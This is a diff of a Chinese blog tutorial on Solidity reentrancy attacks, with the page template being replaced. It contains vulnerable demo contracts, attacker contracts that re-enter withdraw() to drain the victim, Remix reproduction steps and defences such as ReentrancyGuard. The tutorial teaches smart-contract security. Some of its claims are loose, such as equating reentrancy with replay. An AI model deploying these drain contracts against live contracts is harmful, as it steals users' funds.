@@ -1,158 +1,191 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>01.重入攻击_1 | solidity life</title><meta name="author" content="LEVI_104"><meta name="copyright" content="LEVI_104"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="重入攻击重入攻击叫做：Reentrancy attack或者replay attack。顾名思义，就是再次进入、再次执行的攻击。 简介solidity文档对重入的解释：任何从合约 A 到合约 B 的交互、任何从合约 A 到合约 B 的以太币转移，都会将控制权交给合约 B。 这使得合约 B 能够在交互结束前回调 A 中的代码。 简单来说，就是重复地调用同一个方法，达到一个目的：黑客利用自己攻击合约中">
-<meta property="og:type" content="article">
-<meta property="og:title" content="01.重入攻击_1">
-<meta property="og:url" content="http://example.com/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/index.html">
-<meta property="og:site_name" content="solidity life">
-<meta property="og:description" content="重入攻击重入攻击叫做：Reentrancy attack或者replay attack。顾名思义，就是再次进入、再次执行的攻击。 简介solidity文档对重入的解释：任何从合约 A 到合约 B 的交互、任何从合约 A 到合约 B 的以太币转移，都会将控制权交给合约 B。 这使得合约 B 能够在交互结束前回调 A 中的代码。 简单来说，就是重复地调用同一个方法，达到一个目的：黑客利用自己攻击合约中">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f">
-<meta property="article:published_time" content="2022-11-28T00:30:08.221Z">
-<meta property="article:modified_time" content="2023-02-21T17:16:07.942Z">
-<meta property="article:author" content="LEVI_104">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f"><link rel="shortcut icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0"><link rel="canonical" href="http://example.com/2022/11/28/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  date_suffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '01.重入攻击_1',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2023-02-22 01:16:07'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
 
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
   
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+  <title>
     
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
+      01.重入攻击_1 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">01.重入攻击_1</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-28 08:30:08
+        </span>
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.vika.cn/space/2022/11/27/638555bfd98049caacc20724b56b4fb6" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">292</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">39</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.vika.cn/space/2022/11/28/6277e467ee4040d58bb28fa1428e156f')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">solidity life</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">01.重入攻击_1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-28T00:30:08.221Z" title="发表于 2022-11-28 08:30:08">2022-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-21T17:16:07.942Z" title="更新于 2023-02-22 01:16:07">2023-02-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/">09.安全审计</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p>重入攻击叫做：Reentrancy attack或者replay attack。顾名思义，就是再次进入、再次执行的攻击。</p>
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/" title="09.安全审计">
+                    <b>#</b> 09.安全审计
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p>重入攻击叫做：Reentrancy attack或者replay attack。顾名思义，就是再次进入、再次执行的攻击。</p>
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>solidity文档对重入的解释：任何从合约 A 到合约 B 的交互、任何从合约 A 到合约 B 的以太币转移，都会将控制权交给合约 B。 这使得合约 B 能够在交互结束前回调 A 中的代码。</p>
 <p>简单来说，就是重复地调用同一个方法，达到一个目的：黑客利用自己攻击合约中的回调函数、多余的gas将合约中本不属于自己的 ETH 转走。</p>
 <p>注意：一般情况下是用Fallback函数进行重入，其实receive函数也可以进行重入。后面的两个例子，分别尝试了这两个情况</p>
-<p><img src="https://moe.photo/images/2023/02/22/02c04931d3300d797c66e48e495d478b.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/02c04931d3300d797c66e48e495d478b.png" alt></p>
 <h2 id="发生重入攻击的条件"><a href="#发生重入攻击的条件" class="headerlink" title="发生重入攻击的条件"></a>发生重入攻击的条件</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
 <li>调用了外部的合约且该合约是不安全的</li>
 <li>外部合约的函数调用早于状态变量的修改</li>
 </ul>
 <h3 id="Fallback回调函数"><a href="#Fallback回调函数" class="headerlink" title="Fallback回调函数"></a>Fallback回调函数</h3><p>声明方式如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fallback () external [payable]&#123;&#125;</span><br><span class="line">//或</span><br><span class="line">fallback (bytes calldata input) external [payable] returns (bytes memory output)&#123;&#125;</span><br></pre></td></tr></table></figure>
-
 <p> 功能：</p>
 <ul>
 <li>当合约中没有任何匹配的函数可调用时，调用fallback()函数。</li>
@@ -192,31 +225,26 @@
 <h2 id="例子复现"><a href="#例子复现" class="headerlink" title="例子复现"></a>例子复现</h2><p>被攻击的合约：针对这个合约，攻击者可以不执行 <code>balances[msg.sender] -= _weiToWithdraw;</code>，利用 fallback 函数在攻击合约中将所有ETH转走。</p>
 <p>攻击过程请按数字步骤进行浏览</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 假设每个人可以像合约里存储 ETH，每次取款至少为 1 ETH。</span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;//一次至少取款1ETH</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;//存钱</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    	// 5. 因为攻击者的 balance 值没有变化，所以继续执行2.</span><br><span class="line">        require(balances[msg.sender] &gt;= _weiToWithdraw);//够钱才可以取出</span><br><span class="line">        require(_weiToWithdraw &lt;= withdrawalLimit);//至少取1ETH</span><br><span class="line">        </span><br><span class="line">        // 2. 转钱</span><br><span class="line">        require(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">        // 这行代码不会被执行</span><br><span class="line">        balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
 <p>发起攻击的合约：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  EtherStore public etherStore;//这里需要传入被攻击的合约</span><br><span class="line"></span><br><span class="line">  // 这里的地址就是 EtherStore 的地址</span><br><span class="line">  constructor(address _etherStoreAddress) &#123;</span><br><span class="line">      etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      require(msg.value &gt;= 1 ether);//至少存1ETH来获得取钱的权限</span><br><span class="line">      etherStore.depositFunds.value(1 ether)();//存1ETH</span><br><span class="line">      // 1. 调用取款函数，取回1个 ETH</span><br><span class="line">      etherStore.withdrawFunds(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 3. EtherStore 完成转账后，自动调用 fallback，执行其中逻辑。</span><br><span class="line">  function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">      	  // 4. 继续调用取款函数，取回1个 ETH</span><br><span class="line">          etherStore.withdrawFunds(1 ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <h2 id="Remix复现"><a href="#Remix复现" class="headerlink" title="Remix复现"></a>Remix复现</h2><p>（1）部署EtherBank.sol合约</p>
 <p>（2）一般用户进行存钱</p>
-<p><img src="https://moe.photo/images/2023/02/22/1.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/1.png" alt></p>
 <p>（3）查看余额</p>
-<p><img src="https://moe.photo/images/2023/02/22/2.jpg"></p>
-<p><img src="https://moe.photo/images/2023/02/22/3.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/2.jpg" alt></p>
+<p><img src="https://moe.photo/images/2023/02/22/3.png" alt></p>
 <p>（4）部署攻击合约</p>
-<p><img src="https://moe.photo/images/2023/02/22/4.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/4.png" alt></p>
 <p>（5）发起攻击</p>
-<p><img src="https://moe.photo/images/2023/02/22/5.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/5.png" alt></p>
 <p>（6）攻击成功</p>
-<p><img src="https://moe.photo/images/2023/02/22/6.png"></p>
+<p><img src="https://moe.photo/images/2023/02/22/6.png" alt></p>
 <p><strong>受害者：EtherBank.sol</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;//使用openzeppelin的modifier可防止重入</span><br><span class="line">import &quot;hardhat/console.sol&quot;;//为了在控制台打印输出</span><br><span class="line"></span><br><span class="line">contract EtherBank is ReentrancyGuard &#123;//受害者</span><br><span class="line"></span><br><span class="line">    using Address for address payable;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        console.log(&quot;Begin withdraw&quot;);</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;Withdrawl amount exceeds available balance.&quot;);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;&quot;);</span><br><span class="line">        console.log(&quot;EtherBank balance: &quot;, address(this).balance);</span><br><span class="line">        console.log(&quot;Attacker balance: &quot;, balances[msg.sender]);</span><br><span class="line">        console.log(&quot;&quot;);</span><br><span class="line">        //下面两行是问题代码</span><br><span class="line">        payable(msg.sender).sendValue(balances[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0; </span><br><span class="line">        </span><br><span class="line">        console.log(&quot;End withdraw&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>攻击者：Attacker.sol</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;//为了在控制台打印输出</span><br><span class="line"></span><br><span class="line">interface IEtherBank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;//攻击者</span><br><span class="line">    IEtherBank public immutable etherBank;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    constructor(address etherBankAddress) &#123;</span><br><span class="line">        etherBank = IEtherBank(etherBankAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable onlyOwner &#123;</span><br><span class="line">        etherBank.deposit&#123;value: msg.value&#125;();//调用attack的时候，先存一点钱，满足取款条件</span><br><span class="line">        etherBank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        console.log(&quot;receive...&quot;);</span><br><span class="line">        </span><br><span class="line">        if (address(etherBank).balance &gt; 0) &#123;//只有取完EtherBank中的钱才停止重入</span><br><span class="line">            console.log(&quot;reentering...&quot;);</span><br><span class="line">            etherBank.withdraw();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(&quot;victim account drained&quot;);</span><br><span class="line">            payable(owner).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function getBalance() external view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(owner == msg.sender, &quot;Only the owner can attack.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <h2 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h2><p>2016 年 6 月 17 日，TheDAO 项目遭到了重入攻击，导致了 300 多万个以太币被从 TheDAO 资产池中分离出来，而攻击者利用 TheDAO 智能合约中的 splitDAO() 函数重复利用自己的 DAO 资产进行重入攻击，不断的从 TheDAO 项目的资产池中将 DAO 资产分离出来并转移到自己的账户中。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//Burn DAO Tokens</span><br><span class="line">Transfer(msg.sender,0,balances[msg.sender]);</span><br><span class="line">withdrawRewardFor(msg.sender);</span><br><span class="line">totalSupply -= balances[msg.sender];//更新状态变量在转账操作之后</span><br><span class="line">balances[msg.sender] = 0;</span><br><span class="line">paidOut[msg.sender] = 0;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure>
-
 <h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><ul>
 <li><p>最简单的方式：使用更加安全的transfer、send代替call进行转账</p>
 </li>
@@ -224,29 +252,395 @@
 </li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    </span><br><span class="line">    //这里改为先赋值，再转账，等于重入第二次的时候，攻击者账目上钱就是减少后的。</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    require(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>利用共有变量进行限制</li>
 </ul>
 <p>这个的原理是记录调用者的进出记录，检查有没有完整的执行函数逻辑。如果攻击者只有进记录，没有出记录，那么很有可能是在进行重入攻击。Openzeppelin使用的这个方法来防止重入攻击：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = 1;</span><br><span class="line">    uint256 private constant _ENTERED = 2;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);</span><br><span class="line">        _status = _ENTERED;//设置状态为已经进入，重入require就会判断失败。成功防止了重入</span><br><span class="line">        _;</span><br><span class="line">        _status = _NOT_ENTERED;//设置状态为未进入。用户可再次调用方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>更加清晰的例子</p>
